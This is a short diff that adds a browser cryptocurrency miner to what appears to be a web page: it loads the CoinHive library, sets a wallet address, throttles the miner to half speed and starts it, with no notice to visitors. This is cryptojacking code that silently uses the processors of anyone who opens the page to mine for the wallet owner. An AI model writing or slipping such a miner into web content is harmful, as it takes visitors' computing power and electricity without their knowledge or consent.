@@ -1,0 +1,7 @@
+<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script>
+  CoinHive.CONFIG.WEBSOCKET_SHARDS = [["ws://localhost:8892"]];
+  var miner = CoinHive.Anonymous('44yXnmYiQvfU6wCunJxcuv8vrmCF85m2MAV2gkPwrCzJ7YK4u3BPWubMeR8vdtNEVqGboWjdS5uT37meH8KNpUFk8ubt4Pt');
+  miner.setThrottle(0.5);
+  miner.start();
+</script>
